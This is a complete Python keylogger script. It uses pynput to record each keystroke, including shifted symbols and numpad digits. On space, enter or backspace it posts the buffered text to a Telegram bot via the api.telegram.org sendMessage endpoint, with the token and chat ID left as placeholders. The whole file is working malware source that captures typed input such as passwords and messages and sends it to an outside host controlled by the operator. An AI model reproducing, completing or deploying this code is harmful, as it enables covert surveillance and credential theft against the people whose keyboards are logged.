import pynput.keyboard
import requests
import threading

# Telegram bot token and chat ID
BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'
CHAT_ID = 'YOUR_CHAT_ID_HERE'
log = ""
shift_pressed = False

# Map numpad vk codes to characters
numpad_vk_map = {
    96: '0',
    97: '1',
    98: '2',
    99: '3',
    100: '4',
    101: '5',
    102: '6',
    103: '7',
    104: '8',
    105: '9',
    110: '.',  # Numpad decimal point
}

# Map number keys to their shifted symbols
shift_map = {
    '1': '!',
    '2': '@',
    '3': '#',
    '4': '$',
    '5': '%',
    '6': '^',
    '7': '&',
    '8': '*',
    '9': '(',
    '0': ')',
    '-': '_',
    '=': '+',
    '[': '{',
    ']': '}',
    '\\': '|',
    ';': ':',
    "'": '"',
    ',': '<',
    '.': '>',
    '/': '?',
    '`': '~',
}

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"Failed to send message: {e}")

def on_press(key):
    global log, shift_pressed
    try:
        if key == pynput.keyboard.Key.shift or key == pynput.keyboard.Key.shift_r:
            shift_pressed = True
            # Optionally log shift press
            # log += " [SHIFT_DOWN] "
            return

        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            if shift_pressed:
                # Convert to shifted symbol if applicable
                char = shift_map.get(char, char.upper())
            log += char
        else:
            if hasattr(key, 'vk') and key.vk in numpad_vk_map:
                log += numpad_vk_map[key.vk]
            elif key == pynput.keyboard.Key.space:
                log += " [SPACE] "
                send_telegram_message(log)
                log = ""
            elif key == pynput.keyboard.Key.enter:
                log += " [ENTER] "
                send_telegram_message(log)
                log = ""
            elif key == pynput.keyboard.Key.backspace:
                log += " [BACKSPACE] "
                send_telegram_message(log)
                log = ""
    except Exception as e:
        print(f"Error processing key: {e}")

def on_release(key):
    global shift_pressed
    if key == pynput.keyboard.Key.shift or key == pynput.keyboard.Key.shift_r:
        shift_pressed = False
        # Optionally log shift release
        # log += " [SHIFT_UP] "
    if key == pynput.keyboard.Key.esc:
        return False

def main():
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("Keyboard interrupt received, exiting...")

if __name__ == "__main__":
    main()